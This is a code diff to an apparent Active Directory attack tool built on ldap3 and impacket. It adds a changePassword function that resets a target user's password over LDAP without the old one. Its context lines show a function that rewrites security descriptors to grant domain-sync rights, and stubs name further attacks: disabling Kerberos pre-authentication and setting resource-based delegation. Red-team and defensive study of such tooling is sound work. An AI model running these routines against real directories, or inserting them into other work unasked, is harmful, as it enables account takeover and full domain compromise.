@@ -1,5 +1,5 @@
 import ldap3, binascii, impacket, random, string
-from ldap3.extend.microsoft import addMembersToGroups
+from ldap3.extend.microsoft import addMembersToGroups, modifyPassword
 from impacket.examples.ntlmrelayx.attacks import ldapattack
 from impacket.examples.ntlmrelayx.utils import config
 from impacket.ldap import ldaptypes
@@ -83,8 +83,22 @@ def addDomainSync(conn, params):
     data = secDesc.getData()
     conn.modify(dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
 
-def changePassword():
-	return
+def changePassword(conn, params):
+    target = params[0]
+    new_pass = params[1]
+    target_dn = getDn(conn, target)
+
+    modifyPassword.ad_modify_password(conn, target_dn, new_pass, old_password=None)
+    if conn.result['result'] == 0:
+        print('Password changed successfully!')
+    else:
+        if conn.result['result'] == 50:
+            raise Exception('Could not modify object, the server reports insufficient rights: ' + conn.result['message'])
+        elif conn.result['result'] == 19:
+            raise Exception('Could not modify object, the server reports a constrained violation: ' + conn.result['message'])
+        else:
+            raise Exception('The server returned an error: ' + conn.result['message'])
+
 def setDontreqpreauth():
 	return
 def setRbcd():
